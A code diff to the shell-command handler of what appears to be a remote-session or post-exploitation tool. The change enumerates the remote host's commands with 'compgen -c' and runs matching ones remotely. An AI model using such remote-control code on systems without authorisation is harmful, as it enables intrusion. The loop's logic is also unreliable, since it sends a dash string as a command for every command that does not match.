@@ -61,11 +61,15 @@ class command:
 				return
 			else:
 				try:
-					result = session.send_command({'cmd':'','args':''})
-					if result:
+					commands = session.send_command({'cmd':'compgen','args':'-c'}).decode().split("\n")
+					for i in commands:
 						if shelld == "ls" or shelld == "cd":
 							pass
+						elif shelld == i:
+							result = session.send_command({'cmd':shelld,'args':''})
+							if result:
+								print(result.decode().rstrip())
 						else:
-							print(result.decode().rstrip())
+							session.send_command({'cmd':'----------------------------------------','args':''})
 				except KeyboardInterrupt:
 					session.send_command({"cmd":"killtask"})
